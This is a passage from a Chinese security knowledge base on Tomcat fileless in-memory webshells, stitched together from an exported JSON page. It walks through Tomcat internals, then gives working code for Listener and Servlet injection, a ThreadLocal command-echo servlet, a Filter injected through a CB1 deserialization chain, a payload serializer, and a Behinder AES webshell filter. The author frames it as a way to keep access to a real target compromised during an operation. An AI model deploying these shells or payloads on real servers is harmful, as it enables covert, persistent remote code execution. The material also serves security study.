standardContext.createWrapper(); wrapper.setName(\"xyz\"); wrapper.setLoadOnStartup(1); wrapper.setServlet(demo); wrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(wrapper); // 这里是增加ServletMapping standardContext.addServletMapping(\"/xyz\",\"xyz\"); out.println(\"injected Servlet success!\"); }catch (Exception e){ e.printStackTrace(); } } } 效果如下： JSP 遇到500 不要慌，访问/abc试一试 Listener 动态注入内存 监听器就是监听某个对象的的状态变化的组件，监听器的相关概念： 事件源：被监听的对象 ----- 三个域对象 request session servletContext 监听器：监听事件源对象 事件源对象的状态的变化都会触发监听器 注册监听器：将监听器与事件源进行绑定 响应行为：监听器监听到事件源的状态变化时 所涉及的功能代码ServletRequestListener 接口 该接口实现的方法有requestDestroyed，requestInitialized，分别是在监听request请求结束，以及request请求开始，我们着重看请求开始的部分 ```java import javax.servlet.ServletRequestEvent; import javax.servlet.ServletRequestListener; public class ListenerDemo implements ServletRequestListener { @Override public void requestDestroyed(ServletRequestEvent servletRequestEvent) { } @Override public void requestInitialized(ServletRequestEvent servletRequestEvent) { } } 在`requestInitialized`这个函数中，我们从`servletRequestEvent`参数中取cmd参数，在当前上下文只要在任意路由下监听到了cmd参数存在值，那么就执行命令，具体操作如下 ```java public void requestInitialized(ServletRequestEvent servletRequestEvent) { String cmd = servletRequestEvent.getServletRequest().getParameter(\"cmd\"); if(cmd != null){ try { Runtime.getRuntime().exec(cmd); } catch (IOException e) {} } } 注意，这里是无回显的 动态注入 在Helloworld这个Servlet中，获取context，并将listener添加进去，具体如下 ServletContext servletContext = request.getSession().getServletContext(); Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); ListenerDemo listenerDemo = new ListenerDemo(); standardContext.addApplicationEventListener(listenerDemo); out.println(\"inject success\"); 因为无回显，所以我们只能执行命令，如弹出计算器 JSP 总结 以上三种根据Servlet的特性，动态注入，jsp文件只要落地，即可动态加载到内存中 姿势 优点 缺点 Filter 1.通过添加全局拦截器对参数进行拦截，来进行恶意代码执行2.通过添加filtermap，可以随便设置路由，所有请求都会过该拦截器 1.引入filterMaps，filterDef，要根据tomcat版本来判断2.代码量较高 Servlet 1. 简单方便，了解Servlet生命周期即可2.更直观了解如何动态添加ServletMapping 1.无法使所有参数都经过恶意代码，只能在我们自己设定的url中才能触发 Listener 1. 简单方便，通过添加监听器对request进行监控2. 在任意url中都能设置我们监听的参数 1. 只要监听的参数含有就会进入监听代码中2. 如果在该jsp页面下访问，则会重放请求 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-07-26 10:39:34 "},"知识库/02.JAVA安全/11.Tomcat内存马无文件攻击/":{"url":"知识库/02.JAVA安全/11.Tomcat内存马无文件攻击/","title":"11.Tomcat内存马无文件攻击","keywords":"","body":"简介 在Tomcat内存马基础入门中，只介绍了对应对于在tomcat中，当jsp文件落地之后动态创建filter,servlet,listener，那么当只能代码执行（也就是文件不能落地）的情况下，就需要利用漏洞，通过反序列化写入内存马，在jsp文件中，request是内置对象，在普通java文件中，要通过层层反射去取对应的request，这就是其中的难点之一；以及在代码执行一般就只执行命令，也没有回显，所以使用Tomcat回显命令也是一个很重要的思路 背景 在某HW过程中，通过shiro拿到某单位的门户权限，留后门的过程中发现该CMS不解析jsp，访问直接404，对应路径没有问题，其他诸如js的等文件都能访问，也没有nginx反向代理对jsp文件进行拦截，就只有一个Tomcat开放着80端口，拿到服务器之后解密后台密码，发现也没有对整个站点的配置情况，时间紧，任务重，此时就需要对目标环境进行权限维持，此时不管是Linux权限维持还是Web权限维持，都需要做，这里针对该目标进行web权限维持，通过shiro反序列化来进行内存马植入。 Tomcat架构原理 此部分全部来自P1n93r-Tomcat 架构原理 Tomcat的启动流程如下： startup.sh -> catalina.sh start -> java -jar org.apache.catalina.startup.Bootstrap.main() Tomcat需要实现的2个核心功能： 处理socket连接，负责网络字节流与Request和Response对象的转化 加载并管理Servlet，以及处理具体的Request请求 为此Tomcat设计了两个核心组件： 连接器（Connector）和容器（Container），连接器负责对外交流，容器负责内部处理；同时Tomcat为了实现支持多种IO模型和应用层协议，多个连接器对接一个容器。 Server 对应一个Tomcat实例； Service 默认只有一个，一个Tomcat实例默认一个Service； Connector 一个Service可能多个连接器，接收不同的连接协议； Container 多个连接器对应一个容器，顶层容器其实就是Engine； 每个组件都有对应的生命周期，需要启动的话，还需要启动自己内部的子组件，比如一个Tomcat实例包含一个Service，一个Service包含多个连接器和一个容器。而一个容器又包含多个Host，Host内部可能有多个Context容器，而一个Context也会包含多个Servlet。整体是一个俄罗斯套娃。 Connecter(连接器) Tomcat支持的IO模型有： NIO：非阻塞IO，采用Java NIO类库实现； NIO2：异步IO，采用JDK7最新的的NIO2类库实现； APR：采用Apache可移植运行库实现，是C/C++编写的本地库； Tomcat支持的应用层协议有： HTTP/1.1：绝大部分WEB应用采用的访问协议； AJP：用于和WEB服务器集成； HTTP/2：HTTP 2.0大幅度提升了WEB性能； 所以一个容器可能对接多个连接器，连接器对Servlet容器屏蔽了网络协议和IO模型，无论是HTTP还是AJP协议，在容器中获取到的都是一个标准的ServletRequest对象。 细化连接器的功能就是： 监听网络端口； 接收网络连接请求； 读取请求网络字节流； 根据具体的应用层协议解析字节流，生成统一的Tomcat Request对象； 将Tomcat Request对象转换成标准的ServletRequest对象； 调用Servlet容器，得到ServletResponse对象； 将ServletResponse转成Tomcat Response对象； 将Tomcat Response转成网络字节流； 将响应字节流写回给浏览器； 其中，Tomcat设计了三个组件，其负责功能如下： EndPoint：负责网络通信，将字节流传递给Processor； Processor：负责处理字节流生成Tomcat Request对象，将Tomcat Request对象传递给Adapter； Adapter：负责将Tomcat Request对象转成ServletRequest对象，传递给容器； 再细化一下连接器，得到如下架构图： ProtocolHandler组件 Endpoint和Processor放在一起抽象成了ProtocolHandler组件，主要负责处理： 网络连接和应层协议 。 Endpoint组件 Endpoint是通信端点，是具体的Socket接收和发送处理器，是对传输层的抽象。因此Endpoint是用TCP/IP协议来进行数据读写的，本质是调用Socket接口； 简而言之，Endpoint接收到Socket连接后，生成一个SocketProcessor任务提交到线程池进行处理，SocketProcessor的run方法将调用Processor组件进行应用层协议的解析，Processor解析后生成Tomcat Request对象，然后会调用Adapter的Service方法，方法内部通过如下代码将Request请求传递到容器中： // Calling the container connector.getService().getContainer().getPipeline().getFirst().invoke(request, response); Adapter组件 由于协议的不同，Tomcat定义了自己的Request类来存放请求信息，但是这个不是标准的ServletRequest。于是需要使用Adapter将Tomcat Request对象转成ServletRequest对象，然后就可以调用容器的service方法了； Container(容器) Connector连接器负责外部交流，Container容器负责内部处理。也就是： 连接器处理Socket通信和应用层协议的解析，得到ServletRequest，而容器则负责处理ServletRequest。 容器顾名思义，就是用来装东西的，Tomcat容器就是用来装载Servlet的； Tomcat设计了4种容器：Engine、Host、Context和Wrapper。这四种容器是父子关系，如下图所示： 一个Host多个Context，一个Context包含多个Servlet； Wrapper表示一个Servlet，Context表示一个WEB应用程序，而一个WEB应用可以有多个Servlet； Host表示一个虚拟机，或者说一个站点，一个Tomcat可以配置多个站点； 一个站点可以部署多个WEB应用； Engine代表引擎，用于管理多个站点（Host），一个Service只能有一个Engine； 下面是Tomcat的配置文件，可以反应这些层次关系： // 顶层组件，可包含多个 Service，代表一个 Tomcat 实例 // 顶层组件，包含一个 Engine ，多个连接器 // 连接器 // 容器组件：一个 Engine 处理 Service 所有请求，包含多个 Host // 容器组件：处理指定Host下的客户端请求， 可包含多个 Context // 容器组件：处理特定 Context Web应用的所有客户端请求 请求定位Servlet的过程 Tomcat使用Mapper组件来完成请求到Wrapper中Servlet的定位的；Mapper组件的功能就是将用户请求的URL定位到一个Servlet，它的工作原理是： Mapper组件里保存了WEB应用的配置信息，也就是容器组件与访问路径的映射关系 。比如Host容器里配置的域名、Context容器里的WEB应用路径以及Wrapper容器里Servlet映射的路径。这是一个多层次的Map； 当一个请求过来，Mapper组件通过解析请求URL里的域名和路径，再到自己保存的Map里去找，就能定位到一个Servlet。 最终，一个请求URL只会定位到一个Wrapper容器，也就是一个Servlet 。 连接器中的Adapter会调用容器的service方法来执行Servlet，最先拿到请求的是Engine容器，Engine容器对请求做一些处理后，会把请求传给自己的子容器Host继续处理，以此类推，最终这个请求会传给Wrapper容器，Wrapper容器会调用最终的Servlet来处理。 整个调用过程是通过Pipeline-Valve管道进行的 。 Pipeline-Valve是责任链模式，责任链模式是指：在一个请求处理的过程中，有很多处理者一次对请求进行处理，每个处理者负责做自己相应的处理，处理完之后再调用下一个处理者继续处理 。Valve表示一个处理点（也就是一个处理阀门)，Valve中的invoke方法就是来处理请求的。 Valve的数据结构如下： public interface Valve { public Valve getNext(); public void setNext(Valve valve); public void invoke(Request request, Response response) } Pipeline的数据结构如下： public interface Pipeline { public void addValve(Valve valve); public Valve getBasic(); public void setBasic(Valve valve); public Valve getFirst(); } Pipeline中有addValve方法，维护了Valve链表，Valve可以插入到Pipeline中，对请求做某些处理。Pipeline中是没有invoke方法的，因为整个调用链的触发是Valve来完成的，Valve完成自己的处理后，调用getNext().invoke()来触发下一个Valve调用。 每个容器都有一个Pipeline对象，只要触发了这个Pipeline的第一个Valve，这个容器里的Pipeline中的Valve都会被调用到。 其中，Pipeline中的getBasic方法获取的Valve处于Valve链的末端，它是Pipeline中必不可少的一个Valve， 负责调用下层容器的Pipeline里的第一个Valve 。 演示图如下图所示： 而整个过程是通过连接器CoyoteAdapter中的service方法触发的，它会调用Engine的第一个Valve，如下所示： @Override public void service(org.apache.coyote.Request req, org.apache.coyote.Response res) { // 省略其他代码 // Calling the container connector.getService().getContainer().getPipeline().getFirst().invoke( request, response); ... } Wrapper容器的最后一个Valve会创建一个Filter链，并调用doFileter方法，最终会调到Servlet的service方法。 Tomcat类加载器 Tomcat自定义的类加载器WebAppClassloader为了隔离WEB应用打破了双亲委托机制，它首先尝试自己加载某个类，如果找不到再交给父类加载器，其目的是优先加载WEB应用自己定义的类。 同时，为了防止WEB应用自己的类覆盖JRE的核心类，在本地WEB应用目录下查找之前，先使用ExtClassLoader（使用双亲委托机制）去加载，这样既打破了双亲委托，同时也能安全加载类； 总结 最终得到总体的请求流程图，如下图所示： Tomcat 回显 该部分大部分来自于threedr3am-基于tomcat的内存 Webshell 无文件攻击技术 环境 jdk jdk8u181 tomcat tomcat8.5.79 首先可以看看一个普通http请求进来的时候，tomcat的部分执行栈： doGet:27, HelloServlet (com.fastjson.test) service:655, HttpServlet (javax.servlet.http) service:764, HttpServlet (javax.servlet.http) internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core) [2] doFilter:166, ApplicationFilterChain (org.apache.catalina.core) doFilter:52, WsFilter (org.apache.tomcat.websocket.server) internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core) [1] doFilter:166, ApplicationFilterChain (org.apache.catalina.core) invoke:197, StandardWrapperValve (org.apache.catalina.core) invoke:97, StandardContextValve (org.apache.catalina.core) invoke:543, AuthenticatorBase (org.apache.catalina.authenticator) invoke:135, StandardHostValve (org.apache.catalina.core) invoke:92, ErrorReportValve (org.apache.catalina.valves) invoke:698, AbstractAccessLogValve (org.apache.catalina.valves) invoke:78, StandardEngineValve (org.apache.catalina.core) service:367, CoyoteAdapter (org.apache.catalina.connector) service:639, Http11Processor (org.apache.coyote.http11) process:65, AbstractProcessorLight (org.apache.coyote) process:882, AbstractProtocol$ConnectionHandler (org.apache.coyote) doRun:1647, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net) run:49, SocketProcessorBase (org.apache.tomcat.util.net) runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads) run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads) run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads) run:748, Thread (java.lang) 按照kingkk师傅的方法，利用的点是在 org.apache.catalina.core.ApplicationFilterChain.internalDoFilter： 其中通过反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化，之后，每次请求进来，就能通过这两个ThreadLocal获取到相应的request和response了。但是，也存在一点小限制，在其set之前，执行完了所有的Filter了**filter.doFilter(request, response, this)**,这个致命的缺点就会导致shiro无法获取到response回显，因为shiro本身就是一个filter private void internalDoFilter(ServletRequest request, ServletResponse response) throws IOException, ServletException { if (this.pos 动态注册Filter 通过动态注册一个Filter，并且把其放到最前面，这样，我们的Filter就能最先执行了，并且也成为了一个内存Webshell了，要实现动态动态注册filter，第一个步骤就是要获取到request和response，第二步则是通过request或者response去创建filter 在这里需要知道ApplicationDispather.WRAP_SAME_OBJECT这个变量为false，且lastServiceRequest初始化都为null，如果能将其request,response都set进去，那么则可以直接获取到request，在这里就需要通过反射将ApplicationDispather.WRAP_SAME_OBJECT设置为true使其走到对应的条件语句中来 这样当我们第二次访问的时候将 response 从 lastServicedResponse 中取出来，然后将我们命令执行的结果直接写在 response 里面就可以了 在这里我们先使用一个servlet来本地尝试一下： 第一次访问利用反射修改特定参数，从而将 request 和 response 存储到 lastServicedRequest 和 lastServicedResponse 中 第二次访问将我们需要的 request 和 response 取出，从而将结果写入 response 中从而达到回显目的 创建一个Servlet，在web.xml里声明name，和path package com.fastjson.test; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.InputStream; import java.io.Writer; import java.lang.reflect.Field; import java.lang.reflect.Modifier; @WebServlet(\"/echo\") @SuppressWarnings(\"all\") public class ShellServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { try{ Class applicationDispatcher = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); Field WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField(\"WRAP_SAME_OBJECT\"); WRAP_SAME_OBJECT_FIELD.setAccessible(true); // 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性 Field f0 = Class.forName(\"java.lang.reflect.Field\").getDeclaredField(\"modifiers\"); f0.setAccessible(true); f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL); Class applicationFilterChain = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); Field lastServicedRequestField = applicationFilterChain.getDeclaredField(\"lastServicedRequest\"); Field lastServicedResponseField = applicationFilterChain.getDeclaredField(\"lastServicedResponse\"); lastServicedRequestField.setAccessible(true); lastServicedResponseField.setAccessible(true); f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()& ~Modifier.FINAL); f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()& ~Modifier.FINAL); ThreadLocal lastServicedRequest = (ThreadLocal) lastServicedRequestField.get(applicationFilterChain); ThreadLocal lastServicedResponse = (ThreadLocal) lastServicedResponseField.get(applicationFilterChain); String cmd = lastServicedRequest!=null ? lastServicedRequest.get().getParameter(\"cmd\"):null; if (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == null || lastServicedResponse == null){ WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,true); lastServicedRequestField.set(applicationFilterChain,new ThreadLocal()); lastServicedResponseField.set(applicationFilterChain,new ThreadLocal()); } else if (cmd!=null){ InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream(); StringBuilder sb = new StringBuilder(\"\"); byte[] bytes = new byte[1024]; int line = 0; while ((line = inputStream.read(bytes))!=-1){ sb.append(new String(bytes,0,line)); } Writer writer = lastServicedResponse.get().getWriter(); writer.write(sb.toString()); writer.flush(); } }catch (Exception e){ e.printStackTrace(); } } @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { } } 首先在访问/echo的时候，第一次访问ApplicationDispatcher.WRAP_SAME_OBJECT这里为false 在这里就会直接把resquest和response 给对应访问的servlet（ShellServlet)然后可以看到 然后到ShellServlet#doGet()的时候，则会进入到if分支因为当前的ApplicationDispather.WRAP_SAME_OBJECT为false，且lastServicedRequest,lastServicedResponse初始化都为null，通过反射将ApplicationDispather.WRAP_SAME_OBJECT这个变量修改为true，并将lastServicedRequest,lastServicedResponse初始化实例化 由于修改值之后，最后到finally，lastServicedRequest，lastServicedResponse又会被设置为(Object) null 然后第二次访问的时候，此时ApplicationDispather.WRAP_SAME_OBJECT为true，进入条件分支，此时lastServicedRequest，lastServicedResponse都已经被赋值 然后到我们的Servlet当中来可以看到，传入的参数cmd被获取到，直接就会执行Runtime.getRuntime().exec() 最后再通过response回显到页面中 反序列化注入Filter 在进行反序列化注入之前，这里使用之前写的Commons Collections 系列靶场 这里主要需要执行两步： 第一步将 request 和 response 存入到 lastServicedRequest 和 lastServicedResponse 中 第二步从 lastServicedRequest 和 lastServicedResponse 获取到我们的 request 和 response ，然后利用 request 获取到 servletcontext 然后动态注册 Filter 存入request和response 第一步还是和上面一样需要存入request 和 response 到 lastServicedRequest 和 lastServicedResponse，在这里写一个TomcatEcho类需要继承AbstractTranslet（因为需要携带恶意字节码到服务端加载执行）在其静态代码块中反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为true，并且对lastServicedRequest和lastServicedResponse这两个ThreadLocal进行初始化 这里贴一下threedr3am师傅的代码 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; /** * @author threedr3am */ public class TomcatEcho extends AbstractTranslet { static { try { /*刚开始反序列化后执行的逻辑*/ //修改 WRAP_SAME_OBJECT 值为 true Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\"); java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\"); java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (!f.getBoolean(null)) { f.setBoolean(null, true); } //初始化 lastServicedRequest c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\"); f = c.getDeclaredField(\"lastServicedRequest\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } //初始化 lastServicedResponse f = c.getDeclaredField(\"lastServicedResponse\"); modifiersField = f.getClass().getDeclaredField(\"modifiers\"); modifiersField.setAccessible(true); modifiersField.setInt(f, f.getModifiers() & ~java.lang.reflect.Modifier.FINAL); f.setAccessible(true); if (f.get(null) == null) { f.set(null, new ThreadLocal()); } } catch (Exception e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 当第一步通过反序列化完成之后，那么WRAP_SAME_OBJECT 值为 true，lastServicedRequest和lastServicedResponse这两个ThreadLocal也都初始化了，那么就能够获取到request，就能获取ServletContext，进而获取到StandardContext 代码如下： package com.fastjson.test; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import org.apache.catalina.LifecycleState; import org.apache.catalina.core.ApplicationContext; import org.apache.catalina.core.StandardContext; import javax.servlet.*; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.Method; /** * @author threedr3am */ public class TomcatInject extends AbstractTranslet implements Filter { /** * webshell命令参数名 */ private final String cmdParamName = \"cmd\"; private final static String filterUrlPattern = \"/*\"; private final static String filterName = \"test\"; static { try { ServletContext servletContext = getServletContext(); if (servletContext != null){ Field ctx = servletContext.getClass().getDeclaredField(\"context\"); ctx.setAccessible(true); ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext); Field stdctx = appctx.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(appctx); if (standardContext != null){ // 这样设置不会抛出报错 Field stateField = org.apache.catalina.util.LifecycleBase.class .getDeclaredField(\"state\"); stateField.setAccessible(true); stateField.set(standardContext, LifecycleState.STARTING_PREP); Filter myFilter =new TomcatInject(); // 调用 doFilter 来动态添加我们的 Filter // 这里也可以利用反射来添加我们的 Filter javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter(filterName,myFilter); // 进行一些简单的设置 filterRegistration.setInitParameter(\"encoding\", \"utf-8\"); filterRegistration.setAsyncSupported(false); // 设置基本的 url pattern filterRegistration .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false, new String[]{\"/*\"}); // 将服务重新修改回来，不然的话服务会无法正常进行 if (stateField != null){ stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED); } // 在设置之后我们需要 调用 filterstart if (standardContext != null){ // 设置filter之后调用 filterstart 来启动我们的 filter Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\"); filterStartMethod.setAccessible(true); filterStartMethod.invoke(standardContext,null); /** * 将我们的 filtermap 插入到最前面 */ Class ccc = null; try { ccc = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\"); } catch (Throwable t){} if (ccc == null) { try { ccc = Class.forName(\"org.apache.catalina.deploy.FilterMap\"); } catch (Throwable t){} } //把filter插到第一位 Method m = Class.forName(\"org.apache.catalina.core.StandardContext\") .getDeclaredMethod(\"findFilterMaps\"); Object[] filterMaps = (Object[]) m.invoke(standardContext); Object[] tmpFilterMaps = new Object[filterMaps.length]; int index = 1; for (int i = 0; i 简单分析 首先将第一步中存入的 request 进行取出 在下面这个静态方法中就是获取对应的ServletContext，当然需要配合第一步的已经修改WRAP_SAME_OBJECT 值为 true 在利用取出的 request 获取到 servletContext 后，就会调用 addFilter 来动态添加 然后在doFilter()函数里完成逻辑就行 测试 在这里使用Y4er——ysoserial大哥修改过的ysoserial，在其中我提取ClassLoaderTemplate，在项目中加入该jar包 package com.myproject.temp; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.lang.reflect.Method; import java.net.URL; import java.net.URLClassLoader; import java.util.zip.GZIPInputStream; public class ClassLoaderTemplate { static String b64; static { try { GZIPInputStream gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(base64Decode(b64))); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); byte[] bs = new byte[4096]; int read; while ((read = gzipInputStream.read(bs)) != -1) { byteArrayOutputStream.write(bs, 0, read); } byte[] bytes = byteArrayOutputStream.toByteArray(); ClassLoader classLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader()); Method defineClass = classLoader.getClass().getSuperclass().getSuperclass().getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClass.setAccessible(true); Class invoke = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length); invoke.newInstance(); } catch (Exception e) { // e.printStackTrace(); } } public static byte[] base64Decode(String bs) throws Exception { Class base64; byte[] value = null; try { base64 = Class.forName(\"java.util.Base64\"); Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e) { try { base64 = Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) { } } return value; } } 然后我们编写序列化代码，这里我直接使用CB1链，分别将TomcatEcho.class，TomcatInject.class序列化成TomcatEcho.ser，TomcatInject.ser package com.myproject.temp; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import org.apache.commons.codec.binary.Base64; import org.apache.wicket.util.file.Files; import java.io.*; import java.lang.reflect.Field; import java.math.BigInteger; import java.util.PriorityQueue; import java.util.zip.GZIPOutputStream; public class Test_3 { public Test_3() { } public static void main(String[] args) throws Exception { byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/Code/JavaCode/fastjson80/target/classes/com/fastjson/test/TomcatEcho.class\")); // byte[] ctBytes = Files.readBytes(new File(\"/Users/aaronluo/Documents/Code/JavaCode/fastjson80/target/classes/com/fastjson/test/TomcatInject.class\")); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass superC = pool.get(AbstractTranslet.class.getName()); CtClass ctClass; ctClass = pool.get(\"com.myproject.temp.ClassLoaderTemplate\"); ctClass.setName(ctClass.getName() + System.nanoTime()); ByteArrayOutputStream outBuf = new ByteArrayOutputStream(); GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf); gzipOutputStream.write(ctBytes); gzipOutputStream.close(); String content = \"b64=\\\"\" + Base64.encodeBase64String(outBuf.toByteArray()) + \"\\\";\"; ctClass.makeClassInitializer().insertBefore(content); ctClass.setSuperclass(superC); ctClass.writeFile(); byte[] classBytes = ctClass.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates, \"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates, targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates, null); BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); Field f3 = comparator.getClass().getDeclaredField(\"property\"); f3.setAccessible(true); f3.set(comparator,\"outputProperties\"); Field f4 = queue.getClass().getDeclaredField(\"queue\"); f4.setAccessible(true); Object[] queueArray = (Object[]) f4.get(queue); queueArray[0] = templates; queueArray[1] = templates; try{ FileOutputStream fileOutputStream = new FileOutputStream(\"tomcatEcho.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); }catch (Exception e){ e.printStackTrace(); } } } 然后对应将TomcatEcho.ser，TomcatInject.ser 通过Base64编码一下 然后再分别发送至服务器（在参数里切记一定要url编码一次） 然后在web根路径下，带入参数cmd，并执行命令，如下所示 注入冰蝎马 注入冰蝎马这里需要注意，虽然只是修改filter逻辑，在doFilter()编写冰蝎马逻辑 首先查看Behinder_v3.0_Beta_9中的shell.jsp代码 冰蝎自定义了一个可以解析class字节数组的类加载器U，逻辑为，使用g方法调用super.defineClass，可以将byte[]直接转换为Class对象 class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } 判断为post请求后，读取请求体中的数据，拿到进行Base64+AES解码后的字节码数据。 if (request.getMethod().equals(\"POST\")) { String k = \"e45e329feb5d925b\";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(\"u\", k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(k.getBytes(), \"AES\")); new U(this.getClass().getClassLoader()).g( c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))) .newInstance().equals(pageContext); } request和session对象 request对象可以通过其doFilter方法参数中传递的ServletRequest获得，而session可以通过request.getSession()获得 HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse)servletResponse; HttpSession session = request.getSession(); pageContext对象 pageContext对象为jsp九大内置对象，在冰蝎作者rebeyond的文章利用动态二进制加密实现新型一句话木马之Java篇中知道，在冰蝎的代码中，服务端需要从pageContext对象中获取出request/response/session。 而在冰蝎3.0 bata7之后不再依赖pageContext对象，只需给在equal函数中传递的object对象中，有request/response/session对象即可，所以此时我们可以把pageContext对象换成一个Map，手动添加这三个对象即可 HashMap pageContext = new HashMap(); pageContext.put(\"request\",request); pageContext.put(\"response\",response); pageContext.put(\"session\",session); 如果如下图所示，在TomcatInject.java里再写一个类U来继承ClassLoader，在编译之后会生成两个Class文件，导致无法调用class U中的方法 因为我们不能实例化自己的类加载器，所以我们就使用反射的方法，调用ClassLoader，不过这里也有一个坑点，就是抽象类，是不可以作为invoke()的第一个参数，所以要使用一个他的继承类作为替代品，代码如下 //revision BehinderFilter Method method = Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); method.setAccessible(true); byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine())); Class evilclass = (Class) method.invoke(this.getClass().getClassLoader(), evilclass_byte,0, evilclass_byte.length); evilclass.newInstance().equals(pageContext); 最后doFilter中注入冰蝎马如下所示 // doFilter逻辑 public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { try { System.out.println(\"Do Filter ......\"); // 获取request和response对象 